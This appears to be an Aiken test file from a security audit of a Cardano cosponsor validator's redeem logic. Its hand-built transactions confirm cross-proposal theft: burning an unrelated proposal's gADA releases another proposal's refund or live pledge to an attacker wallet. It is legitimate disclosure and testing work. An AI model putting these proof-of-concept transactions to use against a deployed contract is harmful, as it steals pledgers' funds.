//// Adversarial audit of `calculation/cosponsor.redeem` (+ `cosponsor_ada_map`).
////
//// These tests call `cosponsor_calc.redeem(...)` directly with hand-built
//// transactions to settle three exploit hypotheses about the gADA-burn /
//// ADA-release accounting. Deterministic fixtures (no fuzzing) so the
//// adversarial control is exact.
////
//// Reading the results:
////   * a test whose body is `redeem(...)` (asserts True) demonstrates that the
////     shown transaction VALIDATES. When the transaction is an exploit, a
////     passing test means the exploit is ACCEPTED by the validator =>
////     CONFIRMED-EXPLOITABLE.
////   * a test whose body is `!redeem(...)` demonstrates the shown transaction
////     is REJECTED.
////
//// No validator logic is modified by this file.

use calculation/cosponsor as cosponsor_calc
use calculation/shared.{proposal_procedure_hash}
use cardano/address.{Address, Script, VerificationKey}
use cardano/assets
use cardano/governance.{GovernanceAction, ProposalProcedure}
use cardano/transaction.{
  InlineDatum, Input, NoDatum, Output, OutputReference, Transaction,
}
use tests/shared.{
  cosponsor_state_output_with_cpp, cosponsor_validator_hash, state_nft,
  state_policy_id,
} as tshared
use types/cosponsor.{Anchor, CosponsorDatum, CosponsoredProposalProcedure}

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

const attacker_key: ByteArray =
  #"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

const anchor_x: ByteArray =
  #"1111111111111111111111111111111111111111111111111111111111111111"

const anchor_a: ByteArray =
  #"2222222222222222222222222222222222222222222222222222222222222222"

const anchor_b: ByteArray =
  #"3333333333333333333333333333333333333333333333333333333333333333"

const anchor_z: ByteArray =
  #"4444444444444444444444444444444444444444444444444444444444444444"

const txid: ByteArray =
  #"9999999999999999999999999999999999999999999999999999999999999999"

// A proposal keyed only by its anchor hash (so distinct anchors => distinct
// proposal_procedure_hash => distinct gADA token names).
fn cpp_with(anchor_hash: ByteArray) -> CosponsoredProposalProcedure {
  CosponsoredProposalProcedure {
    procedure: ProposalProcedure {
      deposit: 1_000_000,
      return_address: Script(cosponsor_validator_hash),
      governance_action: GovernanceAction.NicePoll,
    },
    anchor: Anchor { url: @"https://x", hash: anchor_hash },
  }
}

fn script_addr() -> Address {
  Address {
    payment_credential: Script(cosponsor_validator_hash),
    stake_credential: None,
  }
}

fn out_ref(ix: Int) -> OutputReference {
  OutputReference { transaction_id: txid, output_index: ix }
}

// A pooled `Before` UTxO (a live pledge) for `cpp`, at the script address.
fn before_utxo(
  cpp: CosponsoredProposalProcedure,
  lovelace: Int,
  ix: Int,
) -> Input {
  Input {
    output_reference: out_ref(ix),
    output: Output {
      address: script_addr(),
      value: assets.from_lovelace(lovelace),
      datum: InlineDatum(CosponsorDatum.Before { cosponsored: cpp }),
      reference_script: None,
    },
  }
}

// An `After` UTxO (a refunded deposit awaiting reclaim), at the script address.
fn after_utxo(lovelace: Int, ix: Int) -> Input {
  Input {
    output_reference: out_ref(ix),
    output: Output {
      address: script_addr(),
      value: assets.from_lovelace(lovelace),
      datum: InlineDatum(CosponsorDatum.After),
      reference_script: None,
    },
  }
}

fn attacker_output(lovelace: Int) -> Output {
  Output {
    address: Address {
      payment_credential: VerificationKey(attacker_key),
      stake_credential: None,
    },
    value: assets.from_lovelace(lovelace),
    datum: NoDatum,
    reference_script: None,
  }
}

// A script `After` output (ADA returned to the pool under an After datum).
fn after_output(lovelace: Int) -> Output {
  Output {
    address: script_addr(),
    value: assets.from_lovelace(lovelace),
    datum: InlineDatum(CosponsorDatum.After),
    reference_script: None,
  }
}

// State reference input. The MPF root commits to `cpp` as expired with
// expiration value 1000 (validity_upper 0 + proposal_lifetime 1000). For a
// single-leaf-from-empty tree, membership proof is `[]`.
fn state_ref(cpp: CosponsoredProposalProcedure) -> Input {
  Input {
    output_reference: out_ref(200),
    output: cosponsor_state_output_with_cpp(cpp, 0),
  }
}

fn burn(cpp: CosponsoredProposalProcedure, amount: Int) -> assets.Value {
  assets.from_asset(cosponsor_validator_hash, proposal_procedure_hash(cpp), amount)
}

// ===========================================================================
// H1 — cross-proposal drain of an `After` refund via the "" bucket.
// ===========================================================================
//
// Proposal Y expired earlier and its deposit refund now sits in an `After`
// UTxO worth 5 ADA (Y's gADA holders are entitled to it). The attacker holds
// gADA of an UNRELATED, non-expired proposal X. They pass `expired_proposals`
// EMPTY, so:
//   * the burn of 5 ADA of X-gADA keys to ""  (X not in expired set)
//   * the spent `After` UTxO keys to ""       (`After` always keys to "")
// The merged "" bucket = 5_000_000 + (-5_000_000) = 0, so no cosponsor output
// is required, and the 5 ADA leaves to the attacker's wallet.
//
// redeem() ACCEPTS => the attacker drains Y's refund by burning gADA of a
// completely different proposal. Y's real gADA holders are robbed. CONFIRMED.
test h1_cross_proposal_after_drain_confirmed() {
  let x = cpp_with(anchor_x)
  let tx =
    Transaction {
      ..transaction.placeholder,
      inputs: [after_utxo(5_000_000, 0)],
      outputs: [attacker_output(5_000_000)],
      mint: burn(x, -5_000_000),
      reference_inputs: [state_ref(x)],
    }
  cosponsor_calc.redeem(
    tx,
    cosponsor_validator_hash,
    [],
    [],
    state_policy_id,
    state_nft,
  )
}

// ===========================================================================
// H2 — is the refund-reclaim (redeem-after-propose) path satisfiable?
// ===========================================================================
//
// H2a: the intended reclaim, EXECUTED THE WAY THE SDK DOES IT (empty
// expired_proposals / empty proof). Proposal Z expired, refunded to an `After`
// UTxO worth 4 ADA. A Z-gADA holder burns 4 ADA of Z-gADA and takes the 4 ADA.
// With expired empty, the Z burn keys to "" and the `After` keys to "" -> they
// net. redeem() ACCEPTS. So the path WORKS -- but only because "" does NO
// proposal-identity checking (the very hole H1 exploits).
test h2a_refund_reclaim_empty_expired_works() {
  let z = cpp_with(anchor_z)
  let tx =
    Transaction {
      ..transaction.placeholder,
      inputs: [after_utxo(4_000_000, 0)],
      outputs: [attacker_output(4_000_000)],
      mint: burn(z, -4_000_000),
      reference_inputs: [state_ref(z)],
    }
  cosponsor_calc.redeem(
    tx,
    cosponsor_validator_hash,
    [],
    [],
    state_policy_id,
    state_nft,
  )
}

// H2b: the SAME honest reclaim but done "correctly" -- the holder actually
// LISTS Z in expired_proposals (with a valid MPF proof). Now the Z-gADA burn
// keys to Z's hash, while the `After` refund keys to "". They land in DIFFERENT
// buckets and cannot net:
//   bucket "" : input 4_000_000, output (absent)=0  -> 4_000_000 != 0  FAIL
//   bucket Z  : input -4_000_000, output (absent)=0 -> -4_000_000 != 0 FAIL
// There is NO cosponsor output that fixes both (a bucket can never be negative,
// so Z can never balance while ADA leaves). redeem() REJECTS.
//
// => The "proper" expired-proposal reclaim path is STRUCTURALLY UNSATISFIABLE;
// the After ADA is strandable if anyone lists the proposal. The feature only
// "works" via the unguarded empty path (H2a). expired_present proof passes
// here, so the rejection is purely the bucket split.
test h2b_refund_reclaim_listing_expired_is_unsatisfiable() {
  let z = cpp_with(anchor_z)
  let tx =
    Transaction {
      ..transaction.placeholder,
      inputs: [after_utxo(4_000_000, 0)],
      outputs: [attacker_output(4_000_000)],
      mint: burn(z, -4_000_000),
      reference_inputs: [state_ref(z)],
    }
  !cosponsor_calc.redeem(
    tx,
    cosponsor_validator_hash,
    [],
    [Pair(proposal_procedure_hash(z), 1000)],
    state_policy_id,
    state_nft,
  )
}

// ===========================================================================
// H3 — mixed-bucket arbitrage.
// ===========================================================================
//
// H3a: cross-proposal theft of a LIVE (non-expired) pledge. Proposal A has a
// pooled `Before` UTxO worth 6 ADA (A's pledgers' money, not yet spent). The
// attacker burns 6 ADA of an unrelated, non-expired proposal B's gADA. With
// expired empty, both A's Before and the B burn key to "" -> net 0, no output
// required, attacker pockets A's 6 ADA. A's pledgers are robbed while only
// B-gADA is burned. redeem() ACCEPTS => CONFIRMED (pledge theft, not just
// refund theft).
test h3a_cross_proposal_live_pledge_theft_confirmed() {
  let a = cpp_with(anchor_a)
  let b = cpp_with(anchor_b)
  let tx =
    Transaction {
      ..transaction.placeholder,
      inputs: [before_utxo(a, 6_000_000, 0)],
      outputs: [attacker_output(6_000_000)],
      mint: burn(b, -6_000_000),
      reference_inputs: [state_ref(a)],
    }
  cosponsor_calc.redeem(
    tx,
    cosponsor_validator_hash,
    [],
    [],
    state_policy_id,
    state_nft,
  )
}

// H3b: a legitimate expired-Z redemption and a cross-proposal "" theft ride in
// ONE transaction, proving the buckets do not constrain each other.
//   bucket Z  (expired): input 3 ADA (Z Before) + burn 3 ADA Z  -> 0, no output
//   bucket "" : input 6 ADA (A live Before) + burn 6 ADA B       -> 0, no output
// Attacker walks with 3 ADA (legit) + 6 ADA (A's stolen pledge) = 9 ADA, having
// burned Z-gADA (fine) and B-gADA (irrelevant to A). redeem() ACCEPTS.
test h3b_mixed_expired_plus_theft_confirmed() {
  let z = cpp_with(anchor_z)
  let a = cpp_with(anchor_a)
  let b = cpp_with(anchor_b)
  let tx =
    Transaction {
      ..transaction.placeholder,
      inputs: [before_utxo(z, 3_000_000, 0), before_utxo(a, 6_000_000, 1)],
      outputs: [attacker_output(9_000_000)],
      mint: assets.merge(burn(z, -3_000_000), burn(b, -6_000_000)),
      reference_inputs: [state_ref(z)],
    }
  cosponsor_calc.redeem(
    tx,
    cosponsor_validator_hash,
    [],
    [Pair(proposal_procedure_hash(z), 1000)],
    state_policy_id,
    state_nft,
  )
}

// H3c: BOUNDING the finding. Per-key conservation still holds, so you cannot
// mint ADA from nothing: spend a 5 ADA `After` but burn only 4 ADA of gADA.
//   bucket "" : input 5_000_000 + (-4_000_000) = 1_000_000, output absent = 0
//   -> 1_000_000 != 0  FAIL.
// redeem() REJECTS. The exploit is cross-proposal MISATTRIBUTION of ADA (H1/H3a),
// never lovelace inflation -- total ADA out always equals total gADA burned.
test h3c_over_extraction_rejected() {
  let x = cpp_with(anchor_x)
  let tx =
    Transaction {
      ..transaction.placeholder,
      inputs: [after_utxo(5_000_000, 0)],
      outputs: [attacker_output(5_000_000)],
      mint: burn(x, -4_000_000),
      reference_inputs: [state_ref(x)],
    }
  !cosponsor_calc.redeem(
    tx,
    cosponsor_validator_hash,
    [],
    [],
    state_policy_id,
    state_nft,
  )
}
